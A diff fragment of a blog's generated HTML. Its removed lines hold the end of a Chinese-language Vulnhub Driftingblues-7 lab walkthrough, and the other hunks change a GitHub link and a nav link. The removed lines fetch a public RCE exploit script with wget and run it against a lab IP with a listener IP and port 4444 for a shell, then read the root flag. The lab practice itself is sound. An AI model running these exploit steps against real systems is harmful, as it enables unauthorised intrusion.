-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/h4knet/eonrce/master/eonrce.py</span><br><span class="line">chmod +x eonrce.py</span><br><span class="line">./eonrce.py https://192.168.3.146/ -ip 192.168.3.145 -port 4444，这里要改一下靶机和kali的网络链接方式，改为桥接模式，命令执行的是桥接模式的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/17.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们可以在&#x2F;root目录下，能够找到flag，即flag.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/18.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
 </section>
 
 
@@ -944,7 +985,7 @@
     <div class="social-wrapper">
         
             
-                <a href="https://github.com/artchen" class="social github"
+                <a href="https://github.com/szczecin" class="social github"
                    target="_blank" rel="external">
                     <span class="icon icon-github"></span>
                 </a>
@@ -1063,7 +1104,7 @@
                     </li>
                 
                     <li class="left">
-                        <a href="/SRC"
+                        <a href="/tags/SRC"
                            onfocus="this.blur();"
                            class="nav-SRC dark-btn block">
                             SRC
